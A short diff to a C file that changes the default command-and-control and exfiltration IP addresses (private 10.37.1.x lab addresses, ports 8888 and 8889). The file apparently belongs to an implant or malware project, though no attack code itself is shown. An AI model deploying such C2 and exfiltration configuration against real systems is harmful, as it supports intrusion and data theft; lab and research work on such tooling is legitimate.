@@ -21,13 +21,13 @@
 
 // Configuration (set via Makefile)
 #ifndef C2_IP
-#define C2_IP "10.37.1.249"
+#define C2_IP "10.37.1.149"
 #endif
 #ifndef C2_PORT
 #define C2_PORT 8888
 #endif
 #ifndef EXFIL_IP
-#define EXFIL_IP "10.37.1.249"
+#define EXFIL_IP "10.37.1.149"
 #endif
 #ifndef EXFIL_PORT
 #define EXFIL_PORT 8889
